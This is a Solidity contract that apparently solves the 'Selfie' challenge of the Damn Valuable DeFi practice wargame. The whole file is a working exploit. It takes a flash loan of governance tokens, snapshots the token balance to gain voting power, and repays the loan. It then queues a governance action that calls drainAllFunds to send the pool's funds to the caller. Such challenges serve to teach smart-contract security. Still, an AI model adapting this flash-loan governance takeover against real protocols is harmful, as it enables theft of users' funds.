// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10;

import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";

contract SelfieAttacker {
    SelfiePool internal pool;
    SimpleGovernance public governance;

    constructor(address _pool, address _governanceAddress) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governanceAddress);
    }

    function borrow(uint256 _amount) external {
        pool.flashLoan(_amount);
    }

    function receiveTokens(address _token, uint256 _amount) external {
        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(_token);
        token.snapshot();
        token.transfer(msg.sender, _amount);
    }

    function propose() external {
        governance.queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", msg.sender),
            0
        );
    }
}

interface SelfiePool {
    function flashLoan(uint256 borrowAmount) external;
}
